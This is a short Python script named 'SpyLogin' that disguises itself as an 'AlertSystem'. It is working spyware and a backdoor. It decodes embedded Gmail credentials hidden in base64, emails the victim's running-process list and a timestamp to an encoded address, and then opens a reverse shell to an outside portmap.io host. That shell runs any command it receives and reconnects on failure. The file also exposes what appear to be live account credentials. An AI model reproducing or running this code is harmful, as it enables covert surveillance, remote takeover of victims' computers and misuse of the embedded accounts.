# SpyLogin !
# ************************
# $Author : MrWhitehat
# *************************

import os
import smtplib
from datetime import datetime
import socket
import base64
import subprocess
import time



class Cred:
	def creder(self):
		return b'//4AAGIAAABsAAAAYQAAAGMAAABrAAAAaAAAAGEAAAB0AAAAYQAAADYAAAA5AAAAMwAAAEAAAABnAAAAbQAAAGEAAABpAAAAbAAAAC4AAABjAAAAbwAAAG0AAAA=',b'//4AAHQAAABjAAAAdAAAAHkAAAB3AAAAegAAAHYAAAB1AAAAdAAAAGoAAAB2AAAAagAAAHgAAABnAAAAaQAAAHEAAAA='


class AlertSystem(Cred):
	
	def IsComputerOnline(self):
		host = "smtp.gmail.com"
		port = 587
		while True:
			try:
				s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
				s.connect((host,port))
				return True
			except:
				s.close()
	
	def SendMail(self,Msg):
		if self.IsComputerOnline():
			server = smtplib.SMTP("smtp.gmail.com",587)
			server.starttls()
			Cred1 , Cred2 = self.creder()
			server.login(base64.b64decode(Cred1).decode("utf-32"),base64.b64decode(Cred2).decode("utf-32"))
			msg = f"Subject:This Alert System\t\n{Msg}"
			server.sendmail(base64.b64decode(Cred1).decode("utf-32"),self.Receiver(),str(msg))
	
	def Receiver(self):
		return base64.b64decode(b'//5zAGEAbgBqAGEAaQBzAGEANQA0AEAAZwBtAGEAaQBsAC4AYwBvAG0A').decode("utf-16")

	def RequestDataTime(self):
		d = datetime.now()
		return d
	
	def GetRunningProc(self):
		Task = subprocess.getoutput("tasklist")
		return str(Task)
	def LowSystemAccess(self):
		host= "pramoth-"+"41592."+"portmap.io"
		port = 60067
		s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		s.connect((host,port))
		time.sleep(10)
		while True:
			try:
				cmd = s.recv(2048).decode()
				if cmd.lower().strip()=="exit":
					s.close()
					break
				OutPut = subprocess.getoutput(cmd)
				Cons = " Prompt > " + OutPut
				s.send(Cons.encode())
			except:
				self.LowSystemAccess()
	def ContollerCode(self):
		time.sleep(10)
		Msg  =  str(self.RequestDataTime()) + "\n" + str(self.GetRunningProc()) + "\n" + "Starts a Socket In 50 s"
		self.SendMail(Msg)
		time.sleep(50)
		self.LowSystemAccess()
		
c = AlertSystem()
c.ContollerCode()